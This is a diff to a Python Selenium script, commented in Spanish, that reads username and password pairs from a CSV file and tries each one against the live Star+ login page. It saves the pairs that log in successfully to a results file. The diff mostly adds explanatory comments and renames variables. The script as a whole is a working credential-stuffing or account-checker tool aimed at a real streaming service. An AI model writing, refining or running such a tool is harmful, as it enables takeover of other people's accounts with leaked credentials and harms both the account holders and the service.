@@ -7,27 +7,32 @@ from selenium.common.exceptions import NoSuchElementException, WebDriverExceptio
 
 def iniciar_sesion(usuario, contrasena, credenciales_validas):
     try:
+        # Inicializar el navegador Chrome
         driver = webdriver.Chrome()
         driver.maximize_window()
 
+        # Acceder a la página de inicio de sesión de Star+
         driver.get('https://www.starplus.com/es-419/login')
 
         time.sleep(5)
+
+        # Completar el campo de usuario y hacer clic en 'Siguiente'
         username_field = driver.find_element(By.NAME, 'email')
         username_field.send_keys(usuario)
 
-        submit = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[4]/div/main/div/form/div[2]/button')
-        submit.click()
+        submit_next = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[4]/div/main/div/form/div[2]/button')
+        submit_next.click()
         time.sleep(2)
 
+        # Completar el campo de contraseña y hacer clic en 'Iniciar Sesión'
         password_field = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[4]/div/main/div/form/fieldset[2]/span/input')
         password_field.send_keys(contrasena)
 
-        submit = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[4]/div/main/div/form/div/button')
-        submit.click()
+        submit_login = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[4]/div/main/div/form/div/button')
+        submit_login.click()
         time.sleep(3)
         
-        # Busca el mensaje de error en el contenido de la página
+        # Buscar el mensaje de error en el contenido de la página
         page_content = driver.page_source
         if "Ocurrió un error al iniciar sesión" not in page_content:
             print(f"Las credenciales {usuario}, {contrasena} funcionan correctamente")
@@ -37,30 +42,34 @@ def iniciar_sesion(usuario, contrasena, credenciales_validas):
     except WebDriverException as e:
         print(f"Hubo un problema al intentar iniciar sesión con {usuario}, {contrasena}: {str(e)}")
     except Exception as e:
-        # Imprime el mensaje de error específico si lo hay
+        # Imprimir el mensaje de error específico si lo hay
         print(str(e))
     finally:
         # Cerrar el navegador en cualquier caso
         driver.quit()
 
-# Lee las credenciales desde el archivo CSV
+# Ruta al archivo CSV con las credenciales
 csv_file_path = 'csv/data_starplus.csv'
 credenciales_validas = []
 
+# Verificar si el archivo CSV existe
 if os.path.isfile(csv_file_path):
+    # Abrir el archivo CSV
     with open(csv_file_path, 'r') as csv_file:
         csv_reader = csv.reader(csv_file)
 
+        # Iterar sobre cada línea del archivo CSV
         for line in csv_reader:
             usuario = line[0]
             contrasena = line[1]
 
+            # Intentar iniciar sesión con las credenciales actuales
             iniciar_sesion(usuario, contrasena, credenciales_validas)
 
-# Guarda las credenciales válidas en un archivo .txt
+# Guardar las credenciales válidas en un archivo .txt
 if credenciales_validas:
     with open('results/credenciales_validas_starplus.txt', 'w') as txt_file:
         for credencial in credenciales_validas:
             txt_file.write(f"{credencial[0]},{credencial[1]}\n")
 
-print("Credenciales validas guardadas en 'results/credenciales_validas_starplus.txt'")
+print("Credenciales válidas guardadas en 'results/credenciales_validas_starplus.txt'")
